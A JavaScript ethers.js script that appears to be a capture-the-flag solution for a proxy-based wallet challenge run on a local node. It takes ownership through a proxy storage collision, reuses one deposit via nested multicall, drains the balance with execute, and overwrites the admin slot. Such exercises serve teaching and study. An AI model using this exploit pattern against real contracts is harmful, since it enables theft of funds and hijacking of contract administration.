const { ethers } = require("ethers");
require("dotenv").config();
const PROXY_ADDRESS = "0xB171D866832A106B680c555EE020De47fD62cae1";
const CONTRACT_ADDRESS = "0x2484A745a9654f7e8a028E2E5Af61EEd139aBD2c";
const PLAYER_ADDRESS = "0xDD623a4CCD5d6367EE7A4898e0aEd2cA8D2835dA";
const contractInterface = [
  // Constructor
  {
    inputs: [
      {
        internalType: "address",
        name: "_admin",
        type: "address",
      },
      {
        internalType: "address",
        name: "_implementation",
        type: "address",
      },
      {
        internalType: "bytes",
        name: "_initData",
        type: "bytes",
      },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },

  // Public variables
  {
    inputs: [],
    name: "admin",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "pendingAdmin",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },

  // External functions
  {
    inputs: [
      {
        internalType: "address",
        name: "_newAdmin",
        type: "address",
      },
    ],
    name: "proposeNewAdmin",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "_expectedAdmin",
        type: "address",
      },
    ],
    name: "approveNewAdmin",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "_newImplementation",
        type: "address",
      },
    ],
    name: "upgradeTo",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const implementationInterface = [
  {
    inputs: [
      {
        internalType: "address",
        name: "addr",
        type: "address",
      },
    ],
    name: "addToWhitelist",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0xe43252d7",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    name: "balances",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x27e235e3",
  },
  {
    inputs: [],
    name: "deposit",
    outputs: [],
    stateMutability: "payable",
    type: "function",
    payable: true,
    signature: "0xd0e30db0",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
      {
        internalType: "bytes",
        name: "data",
        type: "bytes",
      },
    ],
    name: "execute",
    outputs: [],
    stateMutability: "payable",
    type: "function",
    payable: true,
    signature: "0xb61d27f6",
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "_maxBalance",
        type: "uint256",
      },
    ],
    name: "init",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0xb7b0422d",
  },
  {
    inputs: [],
    name: "maxBalance",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x73ad468a",
  },
  {
    inputs: [
      {
        internalType: "bytes[]",
        name: "data",
        type: "bytes[]",
      },
    ],
    name: "multicall",
    outputs: [],
    stateMutability: "payable",
    type: "function",
    payable: true,
    signature: "0xac9650d8",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x8da5cb5b",
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "_maxBalance",
        type: "uint256",
      },
    ],
    name: "setMaxBalance",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x9d51d9b7",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    name: "whitelisted",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0xd936547e",
  },
];

async function main() {
  const provider = new ethers.providers.JsonRpcProvider(
    "http://localhost:8545"
  );
  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

  const proxyContract = new ethers.Contract(
    PROXY_ADDRESS,
    contractInterface,
    wallet
  );

  const admin = await proxyContract.admin();

  console.log("Admin:", admin);

  // Call pendingAdmin
  const pendingAdmin = await proxyContract.pendingAdmin();
  console.log("Pending admin:", pendingAdmin);

  // Call proposeNewAdmin with your address

  if (pendingAdmin != wallet.address) {
    const tx = await proxyContract.proposeNewAdmin(wallet.address);
    await tx.wait(1);
    const pendingAdmin = await proxyContract.pendingAdmin();
    console.log("new Pending admin:", pendingAdmin);
  }

  const implementationContract = new ethers.Contract(
    PROXY_ADDRESS,
    implementationInterface,
    wallet
  );

  // Add the wallet address to the whitelist
  const addToWhitelistTx = await implementationContract.addToWhitelist(
    wallet.address
  );
  await addToWhitelistTx.wait(1);
  console.log("Wallet address added to the whitelist.");

  const depositFuncSig = "deposit()";
  const encodedFuncSig = ethers.utils
    .keccak256(ethers.utils.toUtf8Bytes(depositFuncSig))
    .substring(0, 10); // Get the first 4 bytes of the keccak256 hash
  const encodedData = ethers.utils.defaultAbiCoder.encode(
    ["bytes[]"],
    [[encodedFuncSig]]
  );

  const multicallFuncSig = "multicall(bytes[])";
  const encodedMulticallFuncSig = ethers.utils
    .keccak256(ethers.utils.toUtf8Bytes(multicallFuncSig))
    .substring(0, 10); // Get the first 4 bytes of the keccak256 hash

  const data1 = encodedMulticallFuncSig + encodedData.substring(2); // strip 0x before adding

  const dataArray = [
    encodedFuncSig, // First function selector // Function signature + input data
    data1,
  ];

  await implementationContract.multicall(dataArray, {
    value: ethers.utils.parseEther("0.1"),
  });
  const balance = await provider.getBalance(PROXY_ADDRESS);
  console.log("contract balance", balance.toString());
  await implementationContract.execute(wallet.address, balance, "0x");

  // Set the max balance for the wallet address
  const setMaxBalanceTx = await implementationContract.setMaxBalance(
    wallet.address
  );
  await setMaxBalanceTx.wait(1);
  console.log("Max balance set for the wallet address.");

  // Get the new admin from the proxy contract
  const newAdmin = await proxyContract.admin();
  console.log("New Admin:", newAdmin);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
